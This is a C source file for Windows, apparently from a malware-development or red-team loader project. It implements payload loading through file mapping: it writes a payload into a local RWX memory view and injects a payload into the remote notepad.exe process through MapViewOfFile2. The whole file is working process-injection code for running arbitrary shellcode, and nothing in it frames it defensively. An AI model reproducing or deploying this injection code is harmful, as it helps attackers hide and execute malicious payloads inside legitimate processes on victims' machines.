#include "payload_loading.h"

#pragma comment (lib, "OneCore.lib")


BOOL  WritePayloadViaLocalFileMapping(IN PBYTE pPayload, IN SIZE_T sPayloadSize, OUT PVOID* pAddress) {
	BOOL		bSTATE			= TRUE;
	HANDLE		hFile			= NULL;
	PVOID		pMapAddress		= NULL;


	// create a file mapping handle with `RWX` memory permissions
	// this doesnt have to allocated `RWX` view of file unless it is specified in the MapViewOfFile call  
	hFile = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, sPayloadSize, NULL);
	if (hFile == NULL) {
		DebugPrint("[!] CreateFileMapping Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	// maps the view of the payload to the memory 
	// FILE_MAP_WRITE | FILE_MAP_EXECUTE are the permissions of the file (payload) - 
	// since we need to write (copy) then execute the payload
	pMapAddress = MapViewOfFile(hFile, FILE_MAP_WRITE | FILE_MAP_EXECUTE, NULL, NULL, sPayloadSize);
	if (pMapAddress == NULL) {
		DebugPrint("[!] MapViewOfFile Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}
	

	DebugPrint("[i] pMapAddress : 0x%p \n", pMapAddress);

	DebugPrint("[i] Copying Payload To 0x%p ...\n", pMapAddress);
	memcpy(pMapAddress, pPayload, sPayloadSize);
	DebugPrint("[+] DONE \n");
	
	
_EndOfFunction:
	*pAddress = pMapAddress;
	if (hFile)
		CloseHandle(hFile);
	return bSTATE;
}


BOOL  WritePayloadViaRemoteFileMapping(IN PBYTE pPayload, IN SIZE_T sPayloadSize, OUT PVOID* pAddress) {
    HANDLE      hProcess            = NULL;
    DWORD		dwProcessId		    = NULL;
	BOOL		bSTATE				= TRUE;
	HANDLE		hFile				= NULL;
	PVOID		pMapLocalAddress	= NULL,
				pMapRemoteAddress	= NULL;

    DebugPrint("[i] File Mapping into remote process notepad.exe\n");

    if (!GetRemoteProcessHandle(L"notepad.exe", &dwProcessId, &hProcess)) {
        DebugPrint("[!] Process is Not Found \n");
        return FALSE;
    }
    DebugPrint("[i] Found Target Process Pid: %d \n", dwProcessId);

	// create a file mapping handle with `RWX` memory permissions
	// this doesnt have to allocated `RWX` view of file unless it is specified in the MapViewOfFile/2 call  
	hFile = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, sPayloadSize, NULL);
	if (hFile == NULL) {
		DebugPrint("\t[!] CreateFileMapping Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	// maps the view of the payload to the memory 
	// FILE_MAP_WRITE are the permissions of the file (payload) - 
	// since we only neet to write (copy) the payload to it
	pMapLocalAddress = MapViewOfFile(hFile, FILE_MAP_WRITE, NULL, NULL, sPayloadSize);
	if (pMapLocalAddress == NULL) {
		DebugPrint("\t[!] MapViewOfFile Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}


	DebugPrint("\t[+] Local Mapping Address : 0x%p \n", pMapLocalAddress);

	DebugPrint("\t[i] Copying Payload To 0x%p ...\n", pMapLocalAddress);
	memcpy(pMapLocalAddress, pPayload, sPayloadSize);
	DebugPrint("[+] DONE \n");

	// maps the payload to a new remote buffer (in the target process)
	// it is possible here to change the memory permissions to `RWX`
	pMapRemoteAddress = MapViewOfFile2(hFile, hProcess, NULL, NULL, NULL, NULL, PAGE_EXECUTE_READ);
	if (pMapRemoteAddress == NULL) {
		DebugPrint("\t[!] MapViewOfFile2 Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	DebugPrint("\t[+] Remote Mapping Address : 0x%p \n", pMapRemoteAddress);

_EndOfFunction:
	*pAddress = pMapRemoteAddress;
	if (hFile)
		CloseHandle(hFile);
	return bSTATE;
}
